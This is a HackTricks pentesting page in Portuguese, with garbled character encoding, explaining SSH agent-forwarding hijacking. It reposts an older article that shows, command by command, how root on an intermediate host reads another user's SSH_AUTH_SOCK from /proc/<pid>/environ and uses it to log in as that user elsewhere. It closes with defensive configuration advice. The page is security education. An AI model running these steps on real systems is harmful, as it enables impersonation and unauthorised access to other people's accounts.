<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>


# Resumo

O que voc√™ pode fazer se descobrir dentro do `/etc/ssh_config` ou dentro de `$HOME/.ssh/config` esta configura√ß√£o:
```
ForwardAgent yes
```
Se voc√™ √© root dentro da m√°quina, provavelmente pode **acessar qualquer conex√£o ssh feita por qualquer agente** que voc√™ possa encontrar no diret√≥rio _/tmp_

Impersonate Bob usando um dos ssh-agent de Bob:
```bash
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
```
## Por que isso funciona?

Quando voc√™ define a vari√°vel `SSH_AUTH_SOCK`, voc√™ est√° acessando as chaves de Bob que foram usadas na conex√£o ssh de Bob. Ent√£o, se a chave privada dele ainda estiver l√° (normalmente estar√°), voc√™ poder√° acessar qualquer host usando-a.

Como a chave privada √© salva na mem√≥ria do agente sem criptografia, suponho que se voc√™ for Bob, mas n√£o souber a senha da chave privada, ainda poder√° acessar o agente e us√°-lo.

Outra op√ß√£o √© que o usu√°rio propriet√°rio do agente e o root podem ser capazes de acessar a mem√≥ria do agente e extrair a chave privada.

# Explica√ß√£o detalhada e explora√ß√£o

**Sirva este post como uma m√°quina do tempo do post agora deletado de:** [**https://www.clockwork.com/news/2012/09/28/602/ssh\_agent\_hijacking/**](https://www.clockwork.com/news/2012/09/28/602/ssh\_agent\_hijacking/)

## **Quando ForwardAgent n√£o pode ser confi√°vel**

SSH sem senhas facilita a vida com sistemas operacionais semelhantes ao Unix. Se sua rede requer sess√µes ssh encadeadas (para acessar uma rede restrita, por exemplo), o encaminhamento do agente se torna extremamente √∫til. Com o encaminhamento do agente, √© poss√≠vel conectar-se do meu laptop ao meu servidor de desenvolvimento e, a partir da√≠, executar um checkout svn de outro servidor, tudo sem senhas, mantendo minha chave privada segura em minha esta√ß√£o de trabalho local.

No entanto, isso pode ser perigoso. Uma r√°pida pesquisa na web revelar√° v√°rios artigos indicando que isso √© seguro apenas se os hosts intermedi√°rios forem confi√°veis. No entanto, raramente voc√™ encontrar√° uma explica√ß√£o do _porqu√™_ √© perigoso.

√â para isso que este artigo serve. Mas primeiro, um pouco de contexto.

## **Como a Autentica√ß√£o sem Senha Funciona**

Ao autenticar no modo normal, o SSH usa sua senha para provar que voc√™ √© quem diz ser. O servidor compara um hash dessa senha com um que ele tem em arquivo, verifica se os hashes correspondem e permite sua entrada.

Se um atacante conseguir quebrar a criptografia usada para proteger sua senha enquanto ela est√° sendo enviada para o servidor, ele pode roub√°-la e fazer login como voc√™ sempre que desejar. Se um atacante puder realizar centenas de milhares de tentativas, eventualmente poder√° adivinhar sua senha.

Um m√©todo de autentica√ß√£o muito mais seguro √© a [autentica√ß√£o de chave p√∫blica](http://www.ibm.com/developerworks/library/l-keyc/index.html), uma forma de fazer login sem senha. A autentica√ß√£o de chave p√∫blica requer um par correspondente de chaves p√∫blica e privada. A chave p√∫blica criptografa mensagens que s√≥ podem ser descriptografadas com a chave privada. O computador remoto usa sua c√≥pia da sua chave p√∫blica para criptografar uma mensagem secreta para voc√™. Voc√™ prova que √© voc√™ descriptografando a mensagem usando sua chave privada e enviando a mensagem de volta para o computador remoto. Sua chave privada permanece segura em seu computador local o tempo todo, protegida contra ataques.

A chave privada √© valiosa e deve ser protegida, ent√£o por padr√£o ela √© armazenada em um formato criptografado. Infelizmente, isso significa inserir sua frase de senha de criptografia antes de us√°-la. Muitos artigos sugerem usar chaves privadas sem frase de senha (n√£o criptografadas) para evitar esse inconveniente. Isso √© uma m√° ideia, pois qualquer pessoa com acesso √† sua esta√ß√£o de trabalho (via acesso f√≠sico, roubo ou hackeamento) agora tamb√©m tem acesso livre a quaisquer computadores configurados com sua chave p√∫blica.

O OpenSSH inclui o [ssh-agent](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-agent), um daemon que √© executado em sua esta√ß√£o de trabalho local. Ele carrega uma c√≥pia descriptografada de sua chave privada na mem√≥ria, para que voc√™ s√≥ precise inserir sua frase de senha uma vez. Em seguida, ele fornece um [socket](http://en.wikipedia.org/wiki/Unix\_domain\_socket) local que o cliente ssh pode usar para pedir a ele para descriptografar a mensagem criptografada enviada de volta pelo servidor remoto. Sua chave privada permanece seguramente protegida na mem√≥ria do processo ssh-agent, permitindo que voc√™ fa√ßa ssh sem digitar senhas.

## **Como o ForwardAgent Funciona**

Muitas tarefas exigem sess√µes ssh "encadeadas". Considere meu exemplo anterior: eu fa√ßo ssh da minha esta√ß√£o de trabalho para o servidor de desenvolvimento. Enquanto estiver l√°, preciso realizar uma atualiza√ß√£o svn, usando o protocolo "svn+ssh". Como seria bobo deixar uma c√≥pia n√£o criptografada da minha supersecreta chave privada em um servidor compartilhado, agora estou preso com autentica√ß√£o por senha. No entanto, se eu habilitar o "ForwardAgent" na configura√ß√£o ssh da minha esta√ß√£o de trabalho, o ssh usa suas capacidades de tunelamento embutidas para criar outro socket no servidor de desenvolvimento que √© tunelado de volta para o socket do ssh-agent em minha esta√ß√£o de trabalho local. Isso significa que o cliente ssh no servidor de desenvolvimento agora pode enviar solicita√ß√µes de "descriptografar esta mensagem secreta" diretamente de volta para o ssh-agent em execu√ß√£o em minha esta√ß√£o de trabalho, autenticando-se no servidor svn sem nunca ter acesso √† minha chave privada.

## **Por que Isso Pode Ser Perigoso**

Simplesmente, qualquer pessoa com privil√©gios de root no servidor intermedi√°rio pode usar livremente seu ssh-agent para se autenticar em outros servidores. Uma simples demonstra√ß√£o mostra o qu√£o trivialmente isso pode ser feito. Os nomes de host e usu√°rios foram alterados para proteger os inocentes.

Meu laptop est√° executando o ssh-agent, que se comunica com os programas clientes ssh por meio de um socket. O caminho para este socket √© armazenado na vari√°vel de ambiente SSH\_AUTH\_SOCK:
```
mylaptop:~ env|grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/launch-oQKpeY/Listeners

mylaptop:~ ls -l /tmp/launch-oQKpeY/Listeners
srwx------  1 alice  wheel  0 Apr  3 11:04 /tmp/launch-oQKpeY/Listeners
```
O programa [ssh-add](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-add) nos permite visualizar e interagir com chaves no agente:
```
mylaptop:~ alice$ ssh-add -l
2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)
```
Eu tenho "ForwardAgent yes" no \~/.ssh/config no meu laptop. Ent√£o o ssh vai criar um t√∫nel conectando o socket local a um socket local no servidor remoto:
```
mylaptop:~ alice$ ssh seattle

seattle:~ $ env|grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-WsKcHa9990/agent.9990
```
Mesmo que minhas chaves n√£o estejam instaladas em "seattle", os programas cliente ssh ainda conseguem acessar o agente em execu√ß√£o em minha m√°quina local:
```
seattle:~ alice $ ssh-add -l
2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)
```
Ent√£o... com quem podemos mexer?
```
seattle:~ alice $ who
alice   pts/0        2012-04-06 18:24 (office.example.com)
bob     pts/1        2012-04-03 01:29 (office.example.com)
alice   pts/3        2012-04-06 18:31 (office.example.com)
alice   pts/5        2012-04-06 18:31 (office.example.com)
alice   pts/6        2012-04-06 18:33 (office.example.com)
charlie pts/23       2012-04-06 13:10 (office.example.com)
charlie pts/27       2012-04-03 12:32 (office.example.com)
bob     pts/29       2012-04-02 10:58 (office.example.com)
```
Nunca gostei do Bob. Para encontrar a conex√£o do agente dele, preciso encontrar o processo filho de uma das sess√µes ssh dele:
```
seattle:~ alice $ sudo -s
[sudo] password for alice:

seattle:~ root # pstree -p bob
sshd(16816)‚îÄ‚îÄ‚îÄbash(16817)

sshd(25296)‚îÄ‚îÄ‚îÄbash(25297)‚îÄ‚îÄ‚îÄvim(14308)
```
Existem v√°rias maneiras para o root visualizar o ambiente de um processo em execu√ß√£o. No Linux, os dados est√£o dispon√≠veis em /proc/<pid>/environ. Como eles s√£o armazenados em strings terminadas por NULL, vou usar o tr para converter os NULLs em novas linhas:
```
seattle:~ root # tr '' 'n' < /proc/16817/environ | grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816
```
Agora tenho tudo o que preciso saber para sequestrar o ssh-agent do Bob:
```
seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh-add -l
2048 05:f1:12:f2:e6:ad:cb:0b:60:e3:92:fa:c3:62:19:17 /home/bob/.ssh/id_rsa (RSA)
```
Se eu tiver um alvo espec√≠fico em mente, agora devo ser capaz de me conectar diretamente. Caso contr√°rio, apenas observar a lista de processos ou pesquisar no arquivo de hist√≥rico do Bob deve apresentar muitos alvos de oportunidade. Neste caso, eu sei que o Bob tem todos os tipos de arquivos super secretos armazenados no servidor chamado "boston":
```
seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
bob@boston:~$ whoami
bob
```
## **Proteja-se!**

N√£o permita que seu ssh-agent armazene suas chaves indefinidamente. No OS X, configure sua Keychain para bloquear ap√≥s inatividade ou quando a tela √© bloqueada. Em outras plataformas Unix, passe a op√ß√£o -t para o ssh-agent para que suas chaves sejam removidas ap√≥s segundos.

N√£o habilite o encaminhamento do agente ao se conectar a hosts n√£o confi√°veis. Felizmente, a sintaxe \~/.ssh/config torna isso bastante simples:
```
Host trustworthyhost
ForwardAgent yes
```

```
Host *
ForwardAgent no
```
## **Leitura Recomendada**

* [Gerenciamento de chaves OpenSSH](http://www.ibm.com/developerworks/library/l-keyc/index.html) ‚Äì Daniel Robbins
* [Um Guia Ilustrado para Encaminhamento de Agente SSH](http://www.unixwiz.net/techtips/ssh-agent-forwarding.html) ‚Äì Steve Friedl
* [Manual do ssh-agent](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-agent)
* [Manual do ssh-add](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-add)


<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
